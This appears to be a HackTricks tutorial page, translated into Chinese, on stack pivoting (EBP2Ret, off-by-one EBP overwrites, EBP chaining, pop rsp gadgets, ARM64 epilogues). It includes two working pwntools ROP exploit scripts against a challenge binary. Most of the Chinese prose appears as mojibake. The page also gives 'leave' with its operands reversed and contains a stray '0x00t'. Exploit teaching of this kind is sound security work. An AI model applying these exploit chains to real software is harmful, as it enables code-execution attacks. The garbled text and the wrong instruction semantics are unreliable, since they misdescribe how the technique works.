# Stack Pivoting - EBP2Ret - EBP chaining

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

è¯¥æŠ€æœ¯åˆ©ç”¨æ“æ§ **åŸºæŒ‡é’ˆ (EBP)** çš„èƒ½åŠ›ï¼Œé€šè¿‡ä»”ç»†ä½¿ç”¨ EBP å¯„å­˜å™¨å’Œ **`leave; ret`** æŒ‡ä»¤åºåˆ—æ¥é“¾æ¥å¤šä¸ªå‡½æ•°çš„æ‰§è¡Œã€‚

ä½œä¸ºæé†’ï¼Œ**`leave`** åŸºæœ¬ä¸Šæ„å‘³ç€ï¼š
```
mov       ebp, esp
pop       ebp
ret
```
And as the **EBP is in the stack** before the EIP it's possible to control it controlling the stack.

### EBP2Ret

è¿™ä¸ªæŠ€æœ¯åœ¨ä½ å¯ä»¥**æ›´æ”¹ EBP å¯„å­˜å™¨ä½†æ²¡æœ‰ç›´æ¥æ–¹æ³•æ›´æ”¹ EIP å¯„å­˜å™¨**æ—¶ç‰¹åˆ«æœ‰ç”¨ã€‚å®ƒåˆ©ç”¨äº†å‡½æ•°æ‰§è¡Œå®Œæ¯•åçš„è¡Œä¸ºã€‚

å¦‚æœåœ¨ `fvuln` æ‰§è¡ŒæœŸé—´ï¼Œä½ è®¾æ³•åœ¨æ ˆä¸­æ³¨å…¥ä¸€ä¸ªæŒ‡å‘å†…å­˜ä¸­ä½  shellcode åœ°å€çš„**å‡ EBP**ï¼ˆåŠ ä¸Š 4 å­—èŠ‚ä»¥è€ƒè™‘ `pop` æ“ä½œï¼‰ï¼Œä½ å¯ä»¥é—´æ¥æ§åˆ¶ EIPã€‚å½“ `fvuln` è¿”å›æ—¶ï¼ŒESP è¢«è®¾ç½®ä¸ºè¿™ä¸ªæ„é€ çš„ä½ç½®ï¼Œéšåçš„ `pop` æ“ä½œå°† ESP å‡å°‘ 4ï¼Œ**æœ‰æ•ˆåœ°ä½¿å…¶æŒ‡å‘æ”»å‡»è€…åœ¨å…¶ä¸­å­˜å‚¨çš„åœ°å€ã€‚**\
æ³¨æ„ä½ **éœ€è¦çŸ¥é“ 2 ä¸ªåœ°å€**ï¼šESP å°†è¦å»çš„åœ°å€ï¼Œä»¥åŠä½ éœ€è¦åœ¨ ESP æŒ‡å‘çš„åœ°æ–¹å†™å…¥çš„åœ°å€ã€‚

#### Exploit Construction

é¦–å…ˆï¼Œä½ éœ€è¦çŸ¥é“ä¸€ä¸ª**å¯ä»¥å†™å…¥ä»»æ„æ•°æ®/åœ°å€çš„åœ°å€**ã€‚ESP å°†æŒ‡å‘è¿™é‡Œå¹¶**è¿è¡Œç¬¬ä¸€ä¸ª `ret`**ã€‚

ç„¶åï¼Œä½ éœ€è¦çŸ¥é“ `ret` ä½¿ç”¨çš„åœ°å€ï¼Œè¿™å°†**æ‰§è¡Œä»»æ„ä»£ç **ã€‚ä½ å¯ä»¥ä½¿ç”¨ï¼š

* ä¸€ä¸ªæœ‰æ•ˆçš„ [**ONE\_GADGET**](https://github.com/david942j/one\_gadget) åœ°å€ã€‚
* **`system()`** çš„åœ°å€ï¼Œåé¢è·Ÿ **4 ä¸ªåƒåœ¾å­—èŠ‚** å’Œ `"/bin/sh"` çš„åœ°å€ï¼ˆx86 ä½ï¼‰ã€‚
* ä¸€ä¸ª **`jump esp;`** gadget çš„åœ°å€ï¼ˆ[**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg.md)ï¼‰ï¼Œåé¢è·Ÿè¦æ‰§è¡Œçš„ **shellcode**ã€‚
* ä¸€äº› [**ROP**](../rop-return-oriented-programing/) é“¾

è¯·è®°ä½ï¼Œåœ¨å—æ§å†…å­˜çš„ä»»ä½•è¿™äº›åœ°å€ä¹‹å‰ï¼Œå¿…é¡»æœ‰**`4` å­—èŠ‚**ï¼Œå› ä¸º **`pop`** éƒ¨åˆ†çš„ `leave` æŒ‡ä»¤ã€‚å¯ä»¥åˆ©ç”¨è¿™ 4B è®¾ç½®ä¸€ä¸ª**ç¬¬äºŒä¸ªå‡ EBP**ï¼Œå¹¶ç»§ç»­æ§åˆ¶æ‰§è¡Œã€‚

#### Off-By-One Exploit

è¿™ä¸ªæŠ€æœ¯æœ‰ä¸€ä¸ªç‰¹å®šçš„å˜ä½“ï¼Œç§°ä¸ºâ€œOff-By-One Exploitâ€ã€‚å½“ä½ **åªèƒ½ä¿®æ”¹ EBP çš„æœ€ä½æœ‰æ•ˆå­—èŠ‚**æ—¶ä½¿ç”¨ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå­˜å‚¨è¦è·³è½¬åˆ°çš„åœ°å€çš„å†…å­˜ä½ç½®ä¸ **`ret`** å¿…é¡»å…±äº«å‰ 3 ä¸ªå­—èŠ‚ï¼Œä»è€Œå…è®¸åœ¨æ›´å—é™çš„æ¡ä»¶ä¸‹è¿›è¡Œç±»ä¼¼çš„æ“ä½œã€‚\
é€šå¸¸ä¼šä¿®æ”¹å­—èŠ‚ 0x00t ä»¥å°½å¯èƒ½è¿œåœ°è·³è½¬ã€‚

æ­¤å¤–ï¼Œé€šå¸¸åœ¨æ ˆä¸­ä½¿ç”¨ RET sledï¼Œå¹¶å°†çœŸå®çš„ ROP é“¾æ”¾åœ¨æœ«å°¾ï¼Œä»¥ä½¿æ–°çš„ ESP æ›´æœ‰å¯èƒ½æŒ‡å‘ RET SLED å†…éƒ¨ï¼Œå¹¶æ‰§è¡Œæœ€ç»ˆçš„ ROP é“¾ã€‚

### **EBP Chaining**

å› æ­¤ï¼Œå°†ä¸€ä¸ªå—æ§åœ°å€æ”¾å…¥æ ˆçš„ `EBP` æ¡ç›®ä¸­ï¼Œå¹¶åœ¨ `EIP` ä¸­æ”¾å…¥ä¸€ä¸ª `leave; ret` çš„åœ°å€ï¼Œå¯ä»¥**å°† `ESP` ç§»åŠ¨åˆ°æ ˆä¸­å—æ§çš„ `EBP` åœ°å€**ã€‚

ç°åœ¨ï¼Œ**`ESP`** è¢«æ§åˆ¶ï¼ŒæŒ‡å‘ä¸€ä¸ªæœŸæœ›çš„åœ°å€ï¼Œä¸‹ä¸€æ¡è¦æ‰§è¡Œçš„æŒ‡ä»¤æ˜¯ `RET`ã€‚ä¸ºäº†åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå¯ä»¥åœ¨å—æ§çš„ ESP ä½ç½®æ”¾ç½®ä»¥ä¸‹å†…å®¹ï¼š

* **`&(next fake EBP)`** -> ç”±äº `leave` æŒ‡ä»¤ä¸­çš„ `pop ebp` åŠ è½½æ–°çš„ EBP
* **`system()`** -> ç”± `ret` è°ƒç”¨
* **`&(leave;ret)`** -> åœ¨ system ç»“æŸåè°ƒç”¨ï¼Œå®ƒå°† ESP ç§»åŠ¨åˆ°å‡ EBP å¹¶é‡æ–°å¼€å§‹
* **`&("/bin/sh")`**-> `system` çš„å‚æ•°

åŸºæœ¬ä¸Šï¼Œè¿™ç§æ–¹å¼å¯ä»¥é“¾æ¥å¤šä¸ªå‡ EBP æ¥æ§åˆ¶ç¨‹åºçš„æµç¨‹ã€‚

è¿™å°±åƒä¸€ä¸ª [ret2lib](../rop-return-oriented-programing/ret2lib/)ï¼Œä½†æ›´å¤æ‚ï¼Œæ²¡æœ‰æ˜æ˜¾çš„å¥½å¤„ï¼Œä½†åœ¨æŸäº›è¾¹ç¼˜æƒ…å†µä¸‹å¯èƒ½ä¼šå¾ˆæœ‰è¶£ã€‚

æ­¤å¤–ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ª [**æŒ‘æˆ˜ç¤ºä¾‹**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave)ï¼Œä½¿ç”¨è¿™ä¸ªæŠ€æœ¯ä¸ **stack leak** æ¥è°ƒç”¨ä¸€ä¸ªè·èƒœå‡½æ•°ã€‚è¿™æ˜¯é¡µé¢çš„æœ€ç»ˆæœ‰æ•ˆè½½è·ï¼š
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## EBP å¯èƒ½æœªè¢«ä½¿ç”¨

æ­£å¦‚ [**åœ¨è¿™ç¯‡æ–‡ç« ä¸­è§£é‡Šçš„**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1)ï¼Œå¦‚æœä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶æ˜¯ä½¿ç”¨æŸäº›ä¼˜åŒ–ç¼–è¯‘çš„ï¼Œ**EBP æ°¸è¿œæ— æ³•æ§åˆ¶ ESP**ï¼Œå› æ­¤ï¼Œä»»ä½•é€šè¿‡æ§åˆ¶ EBP çš„æ¼æ´åˆ©ç”¨åŸºæœ¬ä¸Šéƒ½ä¼šå¤±è´¥ï¼Œå› ä¸ºå®ƒæ²¡æœ‰ä»»ä½•å®é™…æ•ˆæœã€‚\
è¿™æ˜¯å› ä¸ºå¦‚æœäºŒè¿›åˆ¶æ–‡ä»¶ç»è¿‡ä¼˜åŒ–ï¼Œ**å‰è¨€å’Œå°¾å£°ä¼šå‘ç”Ÿå˜åŒ–**ã€‚

* **æœªä¼˜åŒ–ï¼š**
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
* **ä¼˜åŒ–ï¼š**
```bash
push   %ebx         # save ebx
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore ebx
ret                 # return
```
## å…¶ä»–æ§åˆ¶ RSP çš„æ–¹æ³•

### **`pop rsp`** gadget

[**åœ¨æ­¤é¡µé¢**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) ä½ å¯ä»¥æ‰¾åˆ°ä½¿ç”¨æ­¤æŠ€æœ¯çš„ç¤ºä¾‹ã€‚å¯¹äºè¿™ä¸ªæŒ‘æˆ˜ï¼Œéœ€è¦è°ƒç”¨ä¸€ä¸ªå¸¦æœ‰ä¸¤ä¸ªç‰¹å®šå‚æ•°çš„å‡½æ•°ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ª **`pop rsp` gadget** å’Œä¸€ä¸ª **æ¥è‡ªæ ˆçš„æ³„æ¼**ï¼š
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg \<reg>, rsp gadget
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
### jmp esp

æŸ¥çœ‹ ret2esp æŠ€æœ¯ï¼š

{% content-ref url="../rop-return-oriented-programing/ret2esp-ret2reg.md" %}
[ret2esp-ret2reg.md](../rop-return-oriented-programing/ret2esp-ret2reg.md)
{% endcontent-ref %}

## å‚è€ƒèµ„æ–™ä¸å…¶ä»–ç¤ºä¾‹

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
* [https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html)
* 64 ä½ï¼Œä½¿ç”¨ä»¥ ret sled å¼€å¤´çš„ rop é“¾è¿›è¡Œè¶Šç•Œåˆ©ç”¨
* [https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html)
* 64 ä½ï¼Œæ—  relroã€canaryã€nx å’Œ pieã€‚è¯¥ç¨‹åºæä¾›äº†å †æ ˆæˆ– pie çš„æ³„æ¼å’Œä¸€ä¸ª qword çš„ WWWã€‚é¦–å…ˆè·å–å †æ ˆæ³„æ¼ï¼Œç„¶åä½¿ç”¨ WWW è¿”å›è·å– pie æ³„æ¼ã€‚ç„¶åä½¿ç”¨ WWW åˆ›å»ºä¸€ä¸ªåˆ©ç”¨ `.fini_array` æ¡ç›® + è°ƒç”¨ `__libc_csu_fini` çš„æ°¸æ’å¾ªç¯ï¼ˆ[æ›´å¤šä¿¡æ¯åœ¨è¿™é‡Œ](../arbitrary-write-2-exec/www2exec-.dtors-and-.fini\_array.md)ï¼‰ã€‚åˆ©ç”¨è¿™ä¸ªâ€œæ°¸æ’â€çš„å†™å…¥ï¼Œåœ¨ .bss ä¸­å†™å…¥ä¸€ä¸ª ROP é“¾å¹¶æœ€ç»ˆè°ƒç”¨å®ƒï¼Œé€šè¿‡ RBP è¿›è¡Œ pivotingã€‚

## ARM64

åœ¨ ARM64 ä¸­ï¼Œå‡½æ•°çš„ **å‰è¨€å’Œå°¾å£°** **ä¸åœ¨å †æ ˆä¸­å­˜å‚¨å’Œæ£€ç´¢ SP å¯„å­˜å™¨**ã€‚æ­¤å¤–ï¼Œ**`RET`** æŒ‡ä»¤ä¸ä¼šè¿”å›åˆ° SP æŒ‡å‘çš„åœ°å€ï¼Œè€Œæ˜¯ **è¿”å›åˆ° `x30` å†…çš„åœ°å€**ã€‚

å› æ­¤ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œä»…ä»…åˆ©ç”¨å°¾å£°ä½  **æ— æ³•é€šè¿‡è¦†ç›–å †æ ˆä¸­çš„æŸäº›æ•°æ®æ¥æ§åˆ¶ SP å¯„å­˜å™¨**ã€‚å³ä½¿ä½ è®¾æ³•æ§åˆ¶äº† SPï¼Œä½ ä»ç„¶éœ€è¦ä¸€ç§æ–¹æ³•æ¥ **æ§åˆ¶ `x30`** å¯„å­˜å™¨ã€‚

*   å‰è¨€

```armasm
sub sp, sp, 16
stp x29, x30, [sp]      // [sp] = x29; [sp + 8] = x30
mov x29, sp             // FP æŒ‡å‘å¸§è®°å½•
```
*   å°¾å£°

```armasm
ldp x29, x30, [sp]      // x29 = [sp]; x30 = [sp + 8]
add sp, sp, 16
ret
```

{% hint style="danger" %}
åœ¨ ARM64 ä¸­æ‰§è¡Œç±»ä¼¼äºå †æ ˆ pivoting çš„æ–¹æ³•æ˜¯èƒ½å¤Ÿ **æ§åˆ¶ `SP`**ï¼ˆé€šè¿‡æ§åˆ¶æŸä¸ªå¯„å­˜å™¨çš„å€¼ä¼ é€’ç»™ `SP`ï¼Œæˆ–è€…å› ä¸ºæŸç§åŸå›  `SP` ä»å †æ ˆè·å–å…¶åœ°å€å¹¶ä¸”æˆ‘ä»¬æœ‰ä¸€ä¸ªæº¢å‡ºï¼‰ï¼Œç„¶å **åˆ©ç”¨å°¾å£°** ä» **å—æ§çš„ `SP`** åŠ è½½ **`x30`** å¯„å­˜å™¨å¹¶ **`RET`** åˆ°å®ƒã€‚
{% endhint %}

åœ¨ä»¥ä¸‹é¡µé¢ä¸­ï¼Œä½ å¯ä»¥çœ‹åˆ° **ARM64 ä¸­çš„ Ret2esp ç­‰ä»·ç‰©**ï¼š

{% content-ref url="../rop-return-oriented-programing/ret2esp-ret2reg.md" %}
[ret2esp-ret2reg.md](../rop-return-oriented-programing/ret2esp-ret2reg.md)
{% endcontent-ref %}

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨ Twitter ä¸Šå…³æ³¨** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
